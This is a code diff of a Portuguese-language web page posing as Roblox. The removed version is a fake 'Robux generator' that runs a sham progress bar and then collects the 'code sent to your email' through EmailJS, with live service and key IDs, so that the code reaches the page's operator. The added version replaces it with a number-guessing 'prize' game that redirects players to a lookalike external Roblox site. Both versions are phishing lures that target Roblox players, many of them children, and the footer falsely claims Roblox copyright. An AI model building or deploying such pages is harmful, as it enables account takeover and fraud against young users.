@@ -1,27 +1,27 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="pt">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gerador de Robux - Roblox</title>
-    <link rel="icon" href="rob.jpg" type="image/jpeg"> <!-- Logo na aba -->
+    <title>Ganhe Prêmios no Roblox!</title>
+    <link rel="icon" href="rob.jpg" type="image/jpg">
     <style>
-        /* CSS Global */
         body {
             font-family: 'Arial', sans-serif;
-            background-image: url('back.jpg'); /* Imagem de fundo */
-            background-size: cover; /* Tamanho da imagem de fundo */
-            color: #444; /* Cor do texto */
+            background-image: url('back.jpg');
+            background-size: cover;
+            color: #444;
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            height: 100vh; 
             margin: 0;
+            overflow: hidden;
         }
 
         header {
-            background-color: rgba(51, 51, 51, 0.8); /* Fundo com leve transparência */
+            background-color: rgba(51, 51, 51, 0.8);
             color: #fff;
             padding: 20px;
             width: 100%;
@@ -32,160 +32,129 @@
         h1 {
             font-size: 2.5em;
             margin: 0;
-            color: #ffcc00; /* Nova cor do título */
+            color: #ffcc00;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
         }
 
-        .container {
-            background-color: rgba(255, 255, 255, 0.9); /* Fundo branco com leve transparência */
-            border-radius: 12px;
-            padding: 20px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
-            width: 300px;
-            text-align: center;
-            border: 2px solid #00c6ff; /* Borda ao redor do container */
+        .content {
+            flex-grow: 1; 
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center; 
+            animation: fadeIn 1s;
         }
 
-        .amount-button, .generate-button, .submit-button {
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .button {
             background-color: #00c6ff;
-            color: #fff;
+            color: white;
             border: none;
-            padding: 12px;
-            border-radius: 8px;
+            padding: 15px 25px;
+            margin: 10px;
+            border-radius: 5px;
             cursor: pointer;
-            width: 100%;
-            font-weight: bold;
-            font-size: 1.1em;
-            transition: background-color 0.3s;
-            margin-bottom: 10px;
-            border: 2px solid #ffcc00; /* Borda do botão */
-        }
-
-        .amount-button.active {
-            background-color: #ff0055; /* Cor ao ser clicado */
-        }
-
-        .loading {
-            display: none;
-            margin-top: 20px;
             font-size: 1.2em;
-            color: #00c6ff;
+            transition: background-color 0.3s, transform 0.3s;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
         }
 
-        .progress-bar {
-            width: 100%;
-            background-color: #e0e0e0;
-            border-radius: 8px;
-            overflow: hidden;
-            margin: 10px 0;
+        .button:hover {
+            background-color: #ff0055;
+            transform: scale(1.05);
         }
 
-        .progress {
-            height: 20px;
-            width: 0;
-            background-color: #00c6ff;
-            transition: width 0.05s;
-        }
-
-        .form-container {
+        .hidden {
             display: none;
-            margin-top: 20px;
         }
 
         footer {
             text-align: center;
             padding: 20px 0;
-            background-color: rgba(51, 51, 51, 0.8); /* Fundo do rodapé com transparência */
+            background-color: rgba(51, 51, 51, 0.8);
             color: #fff;
             width: 100%;
-            position: absolute;
-            bottom: 0;
+            position: relative; 
         }
 
         footer p {
             margin: 0;
         }
+
+        .game-container {
+            background-color: rgba(255, 255, 255, 0.9);
+            border-radius: 12px;
+            padding: 20px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+            margin: 20px;
+            width: 300px;
+            text-align: center;
+        }
+
+        .game-message {
+            margin: 10px 0;
+            font-size: 1.2em;
+        }
+
+        .input-field {
+            padding: 10px;
+            border-radius: 5px;
+            border: 2px solid #00c6ff;
+            width: 80%;
+            margin: 10px 0;
+        }
+
     </style>
+    <script>
+        let randomNumber;
+
+        function startGame() {
+            randomNumber = Math.floor(Math.random() * 10) + 1; // Número aleatório entre 1 e 10
+            document.getElementById('game-container').classList.remove('hidden');
+            document.getElementById('game-result').innerText = '';
+        }
+
+        function checkGuess() {
+            const userGuess = parseInt(document.getElementById('user-guess').value);
+            const resultMessage = document.getElementById('game-result');
+
+            if (userGuess === randomNumber) {
+                resultMessage.innerHTML = `
+                    <span class="game-message">Você ganhou!</span>
+                    <button class="button" onclick="window.location.href='https://entrar-na-roblox.github.io/Adopt-me-Free-Pets/'">Reclame seu prêmio</button>
+                `;
+            } else {
+                resultMessage.innerHTML = '<span class="game-message">Não foi dessa vez!</span>';
+            }
+        }
+    </script>
 </head>
 <body>
 
 <header>
-    <h1>Escolha a quantidade de Robux</h1>
+    <h1>Ganhe Prêmios no Roblox!</h1>
 </header>
 
-<div class="container">
-    <button class="amount-button" onclick="toggleActive(this)">100 Robux</button>
-    <button class="amount-button" onclick="toggleActive(this)">500 Robux</button>
-    <button class="amount-button" onclick="toggleActive(this)">1000 Robux</button>
+<div class="content">
+    <h2>Qual desses jogos do Roblox você gostaria de obter recompensas especiais?</h2>
+    <button class="button" onclick="startGame()">Iniciar Mini Jogo</button>
 
-    <button class="generate-button" onclick="generateRobux()">Gerar</button>
-    <div id="loading" class="loading"></div>
-    <div class="progress-bar">
-        <div id="progress" class="progress"></div>
-    </div>
-    
-    <div class="form-container" id="form-container">
-        <form id="email-form" onsubmit="sendEmail(event)">
-            <input type="text" id="code" placeholder="Código enviado no e-mail" required>
-            <button type="submit" class="submit-button">Enviar</button>
-        </form>
+    <div id="game-container" class="game-container hidden">
+        <h3>Adivinhe um número entre 1 e 10:</h3>
+        <input type="number" id="user-guess" class="input-field" min="1" max="10" required>
+        <button class="button" onclick="checkGuess()">Enviar Palpite</button>
+        <div id="game-result" class="game-message"></div>
     </div>
 </div>
 
 <footer>
     <p>&copy; 2023 Roblox. Todos os direitos reservados.</p>
 </footer>
-
-<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
-<script>
-    (function(){
-        emailjs.init("y2Y2FotVDMytchPMg"); // Substitua pela sua chave pública
-    })();
-
-    function toggleActive(button) {
-        const buttons = document.querySelectorAll('.amount-button');
-        buttons.forEach(btn => {
-            btn.classList.remove('active'); // Remove a classe 'active' de todos
-        });
-        button.classList.toggle('active'); // Adiciona ou remove a classe 'active' do botão clicado
-    }
-
-    function generateRobux() {
-        const loadingDiv = document.getElementById('loading');
-        const progressBar = document.getElementById('progress');
-        loadingDiv.innerHTML = 'Carregando...';
-        loadingDiv.style.display = 'block';
-        
-        // Simula o carregamento de 1 a 100%
-        let progress = 0;
-        const interval = setInterval(() => {
-            if (progress < 100) {
-                progress++;
-                progressBar.style.width = progress + '%';
-            } else {
-                clearInterval(interval);
-                loadingDiv.innerHTML = 'Robux estão sendo transferidos!<br>Por favor, insira o código.';
-                document.getElementById('form-container').style.display = 'block'; // Exibe o formulário
-            }
-        }, 50); // Ajuste a velocidade do carregamento aqui
-    }
-
-    function sendEmail(event) {
-        event.preventDefault(); // Previne o envio padrão do formulário
-
-        const serviceID = "service_uto6ltk"; // Substitua pelo seu Service ID
-        const templateID = "template_wx7bj1m"; // Substitua pelo seu Template ID
-        const code = document.getElementById('code').value;
-
-        // Enviar o email usando o EmailJS
-        emailjs.send(serviceID, templateID, { code })
-            .then(() => {
-                alert('Código enviado, robux podem chegar em 48h!');
-            })
-            .catch((error) => {
-                alert('Erro ao enviar código: ' + JSON.stringify(error));
-            });
-    }
-</script>
 
 </body>
 </html>
